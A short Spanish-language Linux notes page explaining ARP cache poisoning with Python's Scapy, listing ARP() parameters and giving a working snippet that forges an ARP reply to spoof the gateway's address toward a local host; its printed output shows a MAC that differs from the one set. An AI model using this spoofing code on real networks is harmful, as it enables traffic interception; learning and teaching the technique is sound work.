---
title: "ARP"
description: "ARP"
date: 2021-10-21T15:21:01+02:00
lastmod: 2021-10-21T15:21:01+02:00
draft: true
menu:
  linux:
    parent: linux
weight: 120
toc: true
---


## ARP cache poisoning

Enviar un paquete ARP de respuesta a la máquina con IP `192.168.1.3` con datos falsos `psrc` y `hwsrc`:

Parámetros de la función `ARP`:
- `op=1` envía un paquete ARP request, y `op=2` envía un ARP response.
- `psrc`: source IP.
- `hwsrc`: source MAC (hardware address). Si no está presente, usa la MAC de tu propia máquina.
- `pdst`: destination IP.
- `hwdst`: destination MAC. Si no está presente, lo averigua por ARP al hacer `send()`.

```python
from scapy.all import *

# Crea un paquete de respuesta ARP destinado a pdst, con la info: psrc -> hwsrc
p = ARP(op=2, pdst='192.168.1.3', psrc='192.168.1.1', hwsrc='01:02:03:04:05:06')

# Muestra la info del paquete
p.show()
# ###[ ARP ]###
#   hwtype    = 0x1
#   ptype     = IPv4
#   hwlen     = None
#   plen      = None
#   op        = is-at
#   hwsrc     = 01:02:03:04:05:11
#   psrc      = 192.168.1.1
#   hwdst     = 00:00:00:00:00:00
#   pdst      = 192.168.1.3

# Envía el paquete, posiblemente envenenando la caché ARP del destino.
send(p)
```
